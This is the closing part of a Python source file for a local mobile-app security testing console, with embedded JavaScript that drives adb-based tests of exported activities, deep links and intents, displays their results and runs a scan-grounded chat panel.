    $('#dyn-run').disabled = true; $('#dyn-install').disabled = true;
    return;
  }
  try{
    const r = await (await fetch('/api/devices')).json();
    STATE.devices = r.devices || [];
    $('#dyn-device').innerHTML = STATE.devices.map(d => `<option value="${esc(d.serial)}">${esc(d.serial)} ${esc(d.props?.model || '')}</option>`).join('');
    if (!STATE.devices.length){
      banner.className = 'banner warn';
      banner.innerHTML = 'adb works but no devices connected. Start an emulator or plug in a phone with USB debugging.';
      $('#dyn-run').disabled = true; $('#dyn-install').disabled = true;
    } else {
      banner.className = 'banner ok';
      banner.innerHTML = `<b>${STATE.devices.length}</b> device(s) connected — ready.`;
      $('#dyn-run').disabled = false; $('#dyn-install').disabled = false; $('#dyn-uninstall').disabled = false;
    }
  } catch(e){
    banner.className = 'banner bad';
    banner.textContent = 'Error: ' + e.message;
  }
  // Populate activity / deeplink picklists from current scan
  if (STATE.report){
    const e = STATE.report.extras || {};
    const ec = e.exported_components || [];
    const acts = ec.filter(c => c.tag === 'activity' || c.tag === 'activity-alias').map(c => c.name);
    if ($('#dyn-activity-pick')){
      $('#dyn-activity-pick').innerHTML = acts.length
        ? acts.map(a => `<option value="${esc(a)}">${esc(a)}</option>`).join('')
        : '<option value="">(no exported activities)</option>';
    }
    const dls = e.deeplinks || [];
    if ($('#dyn-deeplink-pick')){
      $('#dyn-deeplink-pick').innerHTML = '<option value="">— or pick from scan —</option>'
        + dls.map(d => `<option value="${esc(d.uri)}">${esc(d.uri)}</option>`).join('');
    }
  }
}

function _selectedSerial(){ return $('#dyn-device')?.value || null; }

function _appendDynOut(title, content, isCode){
  const out = $('#dyn-out');
  const div = document.createElement('div');
  div.className = 'box';
  div.innerHTML = `<div class="row" style="justify-content:space-between"><h3 style="margin:0">${esc(title)}</h3><span class="dim" style="font-size:11px">${esc(new Date().toLocaleTimeString())}</span></div>`;
  if (isCode){
    const pre = document.createElement('pre');
    pre.style.cssText = 'background:var(--bg);border:1px solid var(--border-2);border-radius:4px;padding:10px;font-size:11px;max-height:320px;overflow:auto;color:#a8efc1;white-space:pre-wrap;margin-top:8px';
    pre.textContent = content;
    div.appendChild(pre);
  } else {
    const div2 = document.createElement('div');
    div2.style.cssText = 'margin-top:8px;font-size:13px';
    div2.innerHTML = content;
    div.appendChild(div2);
  }
  out.insertBefore(div, out.firstChild);
}

async function quickAction(action, btn, targetSelector){
  if (!STATE.scanId) return;
  const orig = btn ? btn.textContent : '';
  if (btn) { btn.disabled = true; btn.textContent = '…'; }
  try {
    const r = await fetch('/api/scan/' + STATE.scanId + '/quick/' + action, {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({serial: _selectedSerial()})
    });
    const data = await r.json();
    if (!r.ok){ _appendDynOut(action + ' (error)', esc(data.detail || ('HTTP ' + r.status)), false); return; }
    if (action === 'screenshot' && data.image_b64){
      // Show inline screenshot
      const div = document.createElement('div');
      div.className = 'box';
      div.innerHTML = `<div class="row" style="justify-content:space-between"><h3 style="margin:0">📸 Screenshot</h3><span class="dim" style="font-size:11px">${(data.size/1024).toFixed(1)} KB</span></div>
        <img src="data:${data.mime};base64,${data.image_b64}" style="margin-top:8px;max-width:100%;border-radius:4px;border:1px solid var(--border-2)" alt="device screenshot"/>`;
      $('#dyn-out').insertBefore(div, $('#dyn-out').firstChild);
    } else if (targetSelector){
      $(targetSelector).textContent = data.stdout || data.stderr || '(no output)';
    } else {
      const text = (data.stdout || '') + (data.stderr ? ('\n[stderr]\n' + data.stderr) : '');
      _appendDynOut(action, text || '(no output)', true);
    }
  } catch (e) {
    _appendDynOut(action + ' (error)', e.message, false);
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = orig; }
  }
}

async function runActivityTest(activity){
  if (!STATE.scanId) return;
  try {
    const r = await fetch('/api/scan/' + STATE.scanId + '/test/activity', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({activity, serial: _selectedSerial()})
    });
    const d = await r.json();
    const text = JSON.stringify(d, null, 2);
    _appendDynOut('Activity test: ' + activity, text, true);
  } catch (e) { _appendDynOut('Activity test (error)', e.message, false); }
}

async function runDeeplinkTest(uri){
  if (!STATE.scanId) return;
  try {
    const r = await fetch('/api/scan/' + STATE.scanId + '/test/deeplink', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({uri, serial: _selectedSerial()})
    });
    const d = await r.json();
    _appendDynOut('Deep link: ' + uri, JSON.stringify(d, null, 2), true);
  } catch (e) { _appendDynOut('Deep link (error)', e.message, false); }
}

async function sendCustomIntent(){
  if (!STATE.scanId) return;
  const action = $('#dyn-intent-action').value.trim();
  const target = $('#dyn-intent-target').value.trim();
  const extras = $('#dyn-intent-extras').value.trim();
  try {
    const r = await fetch('/api/scan/' + STATE.scanId + '/intent', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({action, target, extras, serial: _selectedSerial()})
    });
    const d = await r.json();
    if (!r.ok){ _appendDynOut('Custom intent (error)', esc(d.detail || ('HTTP ' + r.status)), false); return; }
    const text = '$ ' + (d.command || '') + '\n\n' + (d.stdout || '') + (d.stderr ? ('\n[stderr]\n' + d.stderr) : '');
    _appendDynOut('Custom intent', text, true);
  } catch (e) { _appendDynOut('Custom intent (error)', e.message, false); }
}

async function installAPK(){
  const serial = $('#dyn-device').value;
  const b = $('#dyn-install'); b.disabled = true; b.textContent = '…';
  const r = await (await fetch('/api/scan/' + STATE.scanId + '/install', {
    method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({serial})
  })).json();
  b.disabled = false; b.textContent = '⬇ Install APK';
  alert(r.ok ? 'Installed' : 'Failed:\n' + r.stderr);
}

async function uninstallAPK(){
  const serial = $('#dyn-device').value;
  const r = await (await fetch('/api/scan/' + STATE.scanId + '/uninstall', {
    method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({serial})
  })).json();
  alert(r.ok ? 'Uninstalled' : 'Failed:\n' + r.stderr);
}

async function runDynamic(){
  const serial = $('#dyn-device').value;
  const btn = $('#dyn-run'); btn.disabled = true; btn.textContent = 'Running…';
  $('#dyn-out').innerHTML = '<div class="banner warn">Running dynamic tests… 30–120 seconds.</div>';
  try{
    const r = await (await fetch('/api/scan/' + STATE.scanId + '/dynamic', {
      method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({serial})
    })).json();
    renderDynamicResults(r);
  } catch(e){ $('#dyn-out').innerHTML = '<div class="banner bad">Error: ' + esc(e.message) + '</div>'; }
  btn.disabled = false; btn.textContent = '▶ Run full dynamic test';
}

function renderDynamicResults(r){
  if (r.error){ $('#dyn-out').innerHTML = '<div class="banner bad">' + esc(r.error) + '</div>'; return; }
  const s = r.summary || {};
  let html = `<div class="banner ok">Ran <b>${s.total||0}</b> tests · ${s.successes||0} succeeded · <span style="color:var(--bad)">${s.crashes||0} crashed</span> · <span style="color:var(--bad)">${s.leaks||0} data leaks</span></div>`;
  for (const t of (r.tests || [])){
    const bad = (t.verdict || '').includes('CRASHED') || (t.verdict || '').includes('LEAKED');
    html += `<div class="test-result ${bad ? 'bad' : 'ok'}">
      <div class="test-head">
        <span class="test-type">${esc(t.type)}</span>
        <span class="test-target">${esc(t.target)}</span>
        <span class="test-verdict ${bad ? 'sev-tag critical' : 'sev-tag low'}">${esc(t.verdict)}</span>
      </div>
      ${t.result?.command ? `<div class="section-title">Command</div><pre>${esc(t.result.command)}</pre>` : ''}
      ${t.result?.stdout ? `<div class="section-title">Output</div><pre>${esc(String(t.result.stdout).substring(0, 2000))}</pre>` : ''}
      ${t.result?.logcat ? `<div class="section-title">Logcat (filtered)</div><pre>${esc(String(t.result.logcat).substring(0, 2000))}</pre>` : ''}
      ${t.result?.probes ? t.result.probes.map(p => `<div class="section-title">${esc(p.test)} ${p.interesting?'<span style="color:var(--bad)">⚠ interesting</span>':''}</div><pre>${esc(p.command)}\n${esc(p.stdout || '(no output)')}</pre>`).join('') : ''}
    </div>`;
  }
  $('#dyn-out').innerHTML = html;
}

// ====== Chat ======
function checkChat(){
  const b = $('#chat-banner');
  if (!STATE.health?.ollama){
    b.className = 'banner';
    b.innerHTML = '<b>Rule-based mode</b> &nbsp;-&nbsp; I answer questions grounded in this scan\'s findings. For free-form LLM chat, install <a href="https://ollama.com" target="_blank">Ollama</a> + <code class="inline">ollama pull llama3.1:8b</code>.';
  } else {
    b.className = 'banner ok';
    b.innerHTML = '✓ Local LLM ready: ' + STATE.health.ollama_models.join(', ') + ' &nbsp;|&nbsp; rule-based fallback active if model fails';
  }
}

// Render chat reply with markdown-style code blocks (```...```), bold (**...**),
// inline code (`...`), preserved newlines, clickable URLs.
function renderChatMarkdown(reply){
  // Step 1: extract fenced code blocks first so we don't escape their contents wrong
  const codeBlocks = [];
  let working = reply.replace(/```([a-z]*)\n([\s\S]*?)```/g, (m, lang, code) => {
    const idx = codeBlocks.length;
    codeBlocks.push({lang: lang || 'bash', code: code.trim()});
    return `\u0000CODE${idx}\u0000`;
  });
  // Step 2: HTML-escape the rest
  working = esc(working);
  // Step 3: Markdown-light substitutions on the safe text
  working = working
    .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
    .replace(/`([^`]+)`/g, '<code class="inline">$1</code>')
    .replace(/^### (.+)$/gm, '<div class="chat-h3">$1</div>')
    .replace(/(https?:\/\/[^\s<]+)/g, '<a href="$1" target="_blank" style="color:var(--accent-2)">$1</a>');
  // Step 4: re-insert code blocks with proper styling + copy button
  working = working.replace(/\u0000CODE(\d+)\u0000/g, (m, idx) => {
    const blk = codeBlocks[parseInt(idx)];
    const escaped = esc(blk.code);
    return `<div class="chat-code">
      <div class="chat-code-head">
        <span class="chat-code-lang">${esc(blk.lang)}</span>
        <button class="chat-code-copy" onclick="copyCode(this)">⎘ Copy</button>
      </div>
      <pre data-code="${escapeAttr(blk.code)}">${escaped}</pre>
    </div>`;
  });
  return working;
}

function escapeAttr(s){ return String(s||'').replace(/"/g, '&quot;'); }

function copyCode(btn){
  const code = btn.closest('.chat-code').querySelector('pre').dataset.code || '';
  navigator.clipboard.writeText(code).then(() => {
    const orig = btn.textContent;
    btn.textContent = '✓ Copied';
    setTimeout(() => btn.textContent = orig, 1500);
  });
}

async function sendChat(e){
  e.preventDefault();
  if (!STATE.scanId) return;
  const t = $('#chat-input').value.trim();
  if (!t) return;
  $('#chat-input').value = '';
  const u = document.createElement('div'); u.className = 'chat-bubble user'; u.textContent = t;
  $('#chat-msgs').appendChild(u);
  STATE.chat.push({role: 'user', content: t});
  const w = document.createElement('div'); w.className = 'chat-bubble bot';
  w.innerHTML = '<i style="color:var(--muted)">Thinking…</i>';
  $('#chat-msgs').appendChild(w);
  $('#chat-msgs').scrollTop = 1e9;
  try{
    const r = await fetch('/api/scan/' + STATE.scanId + '/chat', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({messages: STATE.chat})
    });
    const d = await r.json();
    const reply = d.reply || '';
    w.innerHTML = '<div class="chat-md">' + renderChatMarkdown(reply) + '</div>'
      + (d.engine ? `<div style="margin-top:8px;font-size:10px;color:var(--muted);font-family:var(--mono);text-transform:uppercase;letter-spacing:1px">via ${esc(d.engine)}</div>` : '');
    STATE.chat.push({role: 'assistant', content: reply});
    $('#chat-msgs').scrollTop = 1e9;
  } catch(err){ w.textContent = 'Error: ' + err.message; }
}

init();
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def index():
    return INDEX_HTML


# =============================================================================
# Entry point
# =============================================================================
if __name__ == "__main__":
    # Load plugins from vexa_plugins/ before starting the server
    plugin_records = load_plugins()
    n_loaded = sum(1 for r in plugin_records if not r.get("error"))
    n_failed = sum(1 for r in plugin_records if r.get("error"))

    print()
    print("=" * 70)
    print("  Vexa - Mobile Application Security Console")
    print("=" * 70)
    print(f"  Data folder:     {DATA_DIR}")
    print(f"  adb:             {adb_path() or 'NOT FOUND (dynamic testing disabled)'}")
    print(f"  Plugins loaded:  {n_loaded}" + (f" ({n_failed} failed)" if n_failed else ""))
    print(f"  Plugin API:      v{VEXA_PLUGIN_API_VERSION}")
    print(f"  Open in browser: http://127.0.0.1:8000")
    print(f"  Press Ctrl+C to stop")
    print("=" * 70)
    print()
    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="info")
